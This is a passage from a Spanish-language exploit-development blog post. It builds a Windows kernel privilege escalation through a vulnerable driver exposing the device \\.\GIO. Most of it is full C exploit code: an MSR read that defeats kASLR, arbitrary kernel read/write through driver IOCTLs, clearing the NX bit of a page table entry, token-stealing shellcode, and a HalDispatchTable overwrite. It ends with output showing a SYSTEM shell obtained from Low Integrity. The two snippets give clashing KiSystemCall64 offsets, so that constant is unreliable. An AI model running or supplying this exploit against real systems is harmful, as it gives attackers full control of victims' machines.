<p class="plain-text">Podemos aprovechar esto ya que el registro MSR <code class="language-plaintext highlighter-rouge">LSTAR</code> o <code class="language-plaintext highlighter-rouge">0xC0000082</code> contiene una dirección hacia <code class="language-plaintext highlighter-rouge">KiSystemCall64</code> que es una función dentro de <code class="language-plaintext highlighter-rouge">nt</code>, si restamos el offset a la función podemos calcular la dirección base del kernel y bypassear <code class="language-plaintext highlighter-rouge">kASLR</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0: kd></span><span class="p"> rdmsr 0xC0000082
msr[c0000082] = fffff806`15811000

</span><span class="ro">0: kd></span><span class="p"> u fffff806`15811000 L1
nt!KiSystemCall64:
fffff806`15811000 0f01f8          swapgs

</span><span class="ro">0: kd></span><span class="p"> ? nt!KiSystemCall64 - nt
Evaluate expression: 4263936 = 00000000`00411000</span>
</code></pre></div></div><br>

<p class="plain-text">El cambio al exploit es que ahora usamos la lectura del registro <code class="language-plaintext highlighter-rouge">MSR</code> para obtener la dirección de <code class="language-plaintext highlighter-rouge">KiSystemCall64</code> y al restar su offset obtener la dirección base de <code class="language-plaintext highlighter-rouge">nt</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include </span><span class="s">&ltstdio.h>
</span><span class="o">#include </span><span class="s">&ltpsapi.h>

</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

</span><span class="o">#define</span><span class="na"> IOCTL_READMSR</span><span class="mi"> 0xC3502580
</span><span class="o">#define</span><span class="na"> REGISTER_LSTAR</span><span class="mi"> 0xC0000082
</span><span class="o">#define</span><span class="na"> OFFSET_KiSystemCall64</span><span class="mi"> 0x42a580

</span><span class="no">typedef struct</span><span class="p"> MSRData {
   </span><span class="na">DWORD</span><span class="p"> Type;
   </span><span class="na">DWORD</span><span class="p"> Register;
   </span><span class="na">QWORD</span><span class="p"> Value;
} </span><span class="na">MSRData</span><span class="p">;

</span><span class="na">QWORD ReadMSR</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> DWORD</span><span class="ra"> reg</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> output[</span><span class="mi">2</span><span class="p">];
    MSRData userData;

    userData.Type</span><span class="o"> =</span><span class="mi"> 1</span><span class="p">;
    userData.Register</span><span class="o"> =</span><span class="p"> reg;

    DeviceIoControl(hDevice, IOCTL_READMSR, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData, </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> MSRData), (</span><span class="na">LPVOID</span><span class="p">) output, </span><span class="o">sizeof</span><span class="p">(output), </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">return</span><span class="p"> output[</span><span class="mi">1</span><span class="p">];
}

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">GIO"</span><span class="p">, GENERIC_READ</span><span class="o"> |</span><span class="p"> GENERIC_WRITE, </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice</span><span class="o"> ==</span><span class="p"> INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">QWORD</span><span class="p"> KiSystemCall64</span><span class="o"> =</span><span class="p"> ReadMSR(hDevice, REGISTER_LSTAR);
    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> KiSystemCall64</span><span class="o"> -</span><span class="p"> OFFSET_KiSystemCall64;

    </span><span class="no">printf</span><span class="p">(</span><span class="s">"[*] Kernel Base: 0x</span><span class="mi">%llx\n</span><span class="s">"</span><span class="p">, kernelBase);
    
    CloseHandle(hDevice);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Si ahora ejecutamos el exploit en un nivel de integridad bajo devuelve la dirección base de <code class="language-plaintext highlighter-rouge">nt</code>, esto es genial, nuestro exploit ahora funciona en <code class="language-plaintext highlighter-rouge">Low Integrity Level</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">whoami</span><span class="p"> /groups |</span><span class="am"> findstr</span><span class="p"> Nivel
Etiqueta obligatoria\Nivel obligatorio bajo                      Etiqueta       S-1-16-4096

C:\Users\user\Desktop> </span><span class="am">exploit.exe</span><span class="p">
[*] Kernel Base: 0xfffff80615400000

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

<p class="plain-text">Simplemente cambiamos la forma de obtener <code class="language-plaintext highlighter-rouge">kernelBase</code> ya que ahora lo hacemos leyendo registros <code class="language-plaintext highlighter-rouge">MSR</code>, luego en <code class="language-plaintext highlighter-rouge">KUSER_SHARED_DATA + 0x800</code> apagamos el bit <code class="language-plaintext highlighter-rouge">XD</code>, guardamos ahí un shellcode y finalmente lo ejecutamos con <code class="language-plaintext highlighter-rouge">NtQueryIntervalProfile</code>.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">#include </span><span class="s">&ltwindows.h>
</span><span class="o">#include</span><span class="s"> &ltstdio.h>
</span><span class="o">#include</span><span class="s"> &ltpsapi.h>

</span><span class="o">#define</span><span class="na"> QWORD ULONGLONG

</span><span class="o">#define</span><span class="na"> IOCTL_COPY</span><span class="mi"> 0xC3502808
</span><span class="o">#define</span><span class="na"> IOCTL_READMSR</span><span class="mi"> 0xC3502580

</span><span class="o">#define</span><span class="na"> OFFSET_KiSystemCall64</span><span class="mi"> 0x411000
</span><span class="o">#define</span><span class="na"> OFFSET_MiGetPteAddress</span><span class="mi"> 0x298780

</span><span class="o">#define</span><span class="na"> REGISTER_LSTAR</span><span class="mi"> 0xC0000082
</span><span class="o">#define</span><span class="na"> KUSER_SHARED_DATA</span><span class="mi"> 0xfffff78000000000

</span><span class="no">typedef struct</span><span class="p"> CopyData {
    </span><span class="na">QWORD</span><span class="p"> DstAddress;
    </span><span class="na">QWORD</span><span class="p"> SrcAddress;
    </span><span class="na">DWORD</span><span class="p"> Size;
} </span><span class="na">CopyData</span><span class="p">;

<span class="no">typedef struct</span><span class="p"> MSRData {
   </span><span class="na">DWORD</span><span class="p"> Type;
   </span><span class="na">DWORD</span><span class="p"> Register;
   </span><span class="na">QWORD</span><span class="p"> Value;
} </span><span class="na">MSRData</span><span class="p">;

</span><span class="no">typedef </span><span class="p">NTSTATUS(</span><span class="na">WINAPI</span><span class="o"> *</span><span class="p">NtQueryIntervalProfile_t) (
    </span><span class="p">IN</span><span class="na"> ULONG</span><span class="p"> ProfileSource,
    </span><span class="p">OUT</span><span class="na"> PULONG</span><span class="p"> Interval
);

NtQueryIntervalProfile_t NtQueryIntervalProfile </span><span class="o">= </span><span class="p">(NtQueryIntervalProfile_t) GetProcAddress(GetModuleHandleA(</span><span class="s">"ntdll.dll"</span><span class="p">), </span><span class="s">"NtQueryIntervalProfile"</span><span class="p">);

</span><span class="na">BYTE</span><span class="p"> tokenStealing[</span><span class="mi">60</span><span class="p">]</span><span class="o"> =</span><span class="p"> {
    </span><span class="mi">0x65</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x14</span><span class="p">,</span><span class="mi"> 0x25</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0x01</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1"> // mov rdx, [gs:0x188]              ; $rdx = _KTHREAD
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x82</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rax, [rdx + 0xb8]            ; $rax = _EPROCESS
    </span><span class="mi">0x50</span><span class="p">,</span><span class="mi"> 0x5b</span><span class="p">,</span><span class="c1">                                           // mov rbx, rax                     ; $rbx = _EPROCESS
                                                          // .loop:
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x9b</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     mov rbx, [rbx + 0x448]       ; $rbx = ActiveProcessLinks
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x81</span><span class="p">,</span><span class="mi"> 0xeb</span><span class="p">,</span><span class="mi"> 0x48</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             //     sub rbx, 0x448               ; $rbx = _EPROCESS
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x83</span><span class="p">,</span><span class="mi"> 0xbb</span><span class="p">,</span><span class="mi"> 0x40</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="c1">       //     cmp qword [rbx + 0x440], 0x4 ; cmp PID to SYSTEM PID
    </span><span class="mi">0x75</span><span class="p">,</span><span class="mi"> 0xe8</span><span class="p">,</span><span class="c1">                                           //     jnz .loop                    ; if zf == 0 -> loop
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0x8b</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov rcx, [rbx + 0x4b8]           ; $rcx = SYSTEM token
    </span><span class="mi">0x80</span><span class="p">,</span><span class="mi"> 0xe1</span><span class="p">,</span><span class="mi"> 0xf0</span><span class="p">,</span><span class="c1">                                     // and cl, 0xf0                     ; clear _EX_FAST_REF struct
    </span><span class="mi">0x48</span><span class="p">,</span><span class="mi"> 0x89</span><span class="p">,</span><span class="mi"> 0x88</span><span class="p">,</span><span class="mi"> 0xb8</span><span class="p">,</span><span class="mi"> 0x04</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="mi"> 0x00</span><span class="p">,</span><span class="c1">             // mov [rax + 0x4b8], rcx           ; store SYSTEM token in _EPROCESS
    </span><span class="mi">0xc3</span><span class="c1">                                                  // ret                              ; return
</span><span class="p">};

</span><span class="na">VOID ArbitraryWrite</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> what</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">,</span><span class="na"> DWORD</span><span class="ra"> size</span><span class="p">) {
    CopyData userData;

    userData.DstAddress</span><span class="o"> =</span><span class="p"> where;
    userData.SrcAddress</span><span class="o"> =</span><span class="p"> what;
    userData.Size</span><span class="o"> =</span><span class="p"> size;

    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">) </span><span class="o">&</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> CopyData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);
}

</span><span class="na">QWORD ArbitraryRead</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> where</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> output;
    CopyData userData;

    userData.DstAddress </span><span class="o">=</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">output;
    userData.SrcAddress</span><span class="o"> =</span><span class="p"> where;
    userData.Size</span><span class="o"> =</span><span class="mi"> 8</span><span class="p">;

    DeviceIoControl(hDevice, IOCTL_COPY, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData, (</span><span class="na">DWORD</span><span class="p">) </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> CopyData), </span><span class="mi">NULL</span><span class="p">,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">return</span><span class="p"> output;
}

</span><span class="na">QWORD ReadMSR</span><span class="p">(</span><span class="na">HANDLE</span><span class="ra"> hDevice</span><span class="p">,</span><span class="na"> DWORD</span><span class="ra"> reg</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> output[</span><span class="mi">2</span><span class="p">];
    MSRData userData;

    userData.Type</span><span class="o"> =</span><span class="mi"> 1</span><span class="p">;
    userData.Register</span><span class="o"> =</span><span class="p"> reg;

    DeviceIoControl(hDevice, IOCTL_READMSR, (</span><span class="na">LPVOID</span><span class="p">)</span><span class="o"> &</span><span class="p">userData, </span><span class="o">sizeof</span><span class="p">(</span><span class="no">struct</span><span class="p"> MSRData), (</span><span class="na">LPVOID</span><span class="p">) output, </span><span class="o">sizeof</span><span class="p">(output), </span><span class="mi">0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">return</span><span class="p"> output[</span><span class="mi">1</span><span class="p">];
}

</span><span class="na">QWORD GetHalDispatchTable</span><span class="p">(</span><span class="na">QWORD</span><span class="ra"> kernelBase</span><span class="p">) {
    </span><span class="na">HMODULE</span><span class="p"> hKernel</span><span class="o"> =</span><span class="p"> LoadLibraryA(</span><span class="s">"C:</span><span class="mi">\\</span><span class="s">Windows</span><span class="mi">\\</span><span class="s">System32</span><span class="mi">\\</span><span class="s">ntoskrnl.exe"</span><span class="p">);

    </span><span class="na">QWORD</span><span class="p"> userHalDispatchTable</span><span class="o"> =</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) GetProcAddress(hKernel, </span><span class="s">"HalDispatchTable"</span><span class="p">);
    </span><span class="na">QWORD</span><span class="p"> offsetHalDispatchTable</span><span class="o"> =</span><span class="p"> userHalDispatchTable</span><span class="o"> -</span><span class="p"> (</span><span class="na">QWORD</span><span class="p">) hKernel;
    </span><span class="na">QWORD</span><span class="p"> kernelHalDispatchTable</span><span class="o"> =</span><span class="p"> kernelBase</span><span class="o"> +</span><span class="p"> offsetHalDispatchTable;

    FreeLibrary(hKernel);
    </span><span class="o">return</span><span class="p"> kernelHalDispatchTable;
}

</span><span class="na">QWORD GetPteAddress</span><span class="p">(</span><span class="na">QWORD</span><span class="ra"> address</span><span class="p">,</span><span class="na"> QWORD</span><span class="ra"> pteBase</span><span class="p">) {
    </span><span class="na">QWORD</span><span class="p"> pteAddress</span><span class="o"> =</span><span class="p"> address</span><span class="o"> >></span><span class="mi"> 9</span><span class="p">;
    pteAddress</span><span class="o"> &=</span><span class="mi"> 0x7ffffffff8</span><span class="p">;
    pteAddress</span><span class="o"> +=</span><span class="p"> pteBase;

    </span><span class="o">return</span><span class="p"> pteAddress;
}

</span><span class="no">int</span><span class="na"> main</span><span class="p">() {
    </span><span class="na">HANDLE</span><span class="p"> hDevice</span><span class="o"> =</span><span class="p"> CreateFileA(</span><span class="s">"</span><span class="mi">\\\\</span><span class="s">.</span><span class="mi">\\</span><span class="s">GIO"</span><span class="p">, GENERIC_READ</span><span class="o"> |</span><span class="p"> GENERIC_WRITE,</span><span class="mi"> 0</span><span class="p">, </span><span class="mi">NULL</span><span class="p">, OPEN_EXISTING,</span><span class="mi"> 0</span><span class="p">,</span><span class="mi"> NULL</span><span class="p">);

    </span><span class="o">if</span><span class="p"> (hDevice </span><span class="o">== </span><span class="p">INVALID_HANDLE_VALUE) {
        </span><span class="no">printf</span><span class="p">(</span><span class="s">"[-] Failed to get handle: 0x</span><span class="mi">%x\n</span><span class="s">"</span><span class="p">, GetLastError());
        </span><span class="no">exit</span><span class="p">(EXIT_FAILURE);
    }

    </span><span class="na">QWORD</span><span class="p"> KiSystemCall64</span><span class="o"> =</span><span class="p"> ReadMSR(hDevice, REGISTER_LSTAR);
    </span><span class="na">QWORD</span><span class="p"> kernelBase</span><span class="o"> =</span><span class="p"> KiSystemCall64</span><span class="o"> -</span><span class="p"> OFFSET_KiSystemCall64;

    </span><span class="na">QWORD</span><span class="p"> kernelHalDispatchTable</span><span class="o"> =</span><span class="p"> GetHalDispatchTable(kernelBase);
    </span><span class="na">QWORD</span><span class="p"> backupHalPointer</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, kernelHalDispatchTable </span><span class="o">+ </span><span class="mi">0x8</span><span class="p">);

    </span><span class="na">QWORD</span><span class="p"> shellcode</span><span class="o"> =</span><span class="p"> KUSER_SHARED_DATA</span><span class="o"> +</span><span class="mi"> 0x800</span><span class="p">;

    </span><span class="na">QWORD</span><span class="p"> pteBase</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, kernelBase</span><span class="o"> +</span><span class="p"> OFFSET_MiGetPteAddress </span><span class="o">+ </span><span class="mi">0x13</span><span class="p">);
    </span><span class="na">QWORD</span><span class="p"> pteData</span><span class="o"> =</span><span class="p"> GetPteAddress(shellcode, pteBase);
    </span><span class="na">QWORD</span><span class="p"> pteValue</span><span class="o"> =</span><span class="p"> ArbitraryRead(hDevice, pteData);
    pteValue </span><span class="o">&= ~</span><span class="p">(</span><span class="mi">1</span><span class="no">ULL</span><span class="o"> <<</span><span class="mi"> 63</span><span class="p">);

    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">pteValue, pteData,</span><span class="mi"> 0x8</span><span class="p">);
    Sleep(</span><span class="mi">100</span><span class="p">);

    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">tokenStealing, shellcode,</span><span class="o"> sizeof</span><span class="p">(tokenStealing));
    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">shellcode, kernelHalDispatchTable</span><span class="o"> +</span><span class="mi"> 0x8</span><span class="p">,</span><span class="mi"> 0x8</span><span class="p">);

    </span><span class="na">DWORD</span><span class="p"> interval;
    NtQueryIntervalProfile(</span><span class="mi">0x10</span><span class="p">,</span><span class="o"> &</span><span class="p">interval);

    ArbitraryWrite(hDevice, (</span><span class="na">QWORD</span><span class="p">)</span><span class="o"> &</span><span class="p">backupHalPointer, kernelHalDispatchTable</span><span class="o"> +</span><span class="mi"> 0x8</span><span class="p">, </span><span class="mi">0x8</span><span class="p">);
    CloseHandle(hDevice);

    </span><span class="no">system</span><span class="p">(</span><span class="s">"cmd.exe"</span><span class="p">);
    </span><span class="o">return</span><span class="mi"> 0</span><span class="p">;
}</span>
</code></pre></div></div><br>

<p class="plain-text">Al ejecutar el exploit pasamos del usuario user que está en <code class="language-plaintext highlighter-rouge">Low Integrity Level</code> al usuario <code class="language-plaintext highlighter-rouge">nt authority\system</code> en <code class="language-plaintext highlighter-rouge">System Integrity Level</code> y con máximos privilegios.</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">C:\Users\user\Desktop> </span><span class="am">whoami</span><span class="p">
windows\user

C:\Users\user\Desktop> </span><span class="am">whoami</span><span class="p"> /groups |</span><span class="am"> findstr</span><span class="p"> Nivel
Etiqueta obligatoria\Nivel obligatorio bajo                      Etiqueta       S-1-16-4096
  
C:\Users\user\Desktop> </span><span class="am">exploit.exe</span><span class="p">
Microsoft Windows [Versión 10.0.19045.6456]
(c) Microsoft Corporation. Todos los derechos reservados.

C:\Users\user\Desktop> </span><span class="am">whoami</span><span class="p">
nt authority\system

C:\Users\user\Desktop> </span><span class="am">whoami</span><span class="p"> /groups |</span><span class="am"> findstr</span><span class="p"> Nivel
Etiqueta obligatoria\Nivel obligatorio del sistema               Etiqueta       S-1-16-16384

C:\Users\user\Desktop></span>
</code></pre></div></div><br>

</section>

</article>
  </div>
  <footer class="footer">
    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
  </footer><br><br>

<script type="text/javascript" src="/js/jquery.min.js"></script>
<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>

    </div>
  </body>
</html>
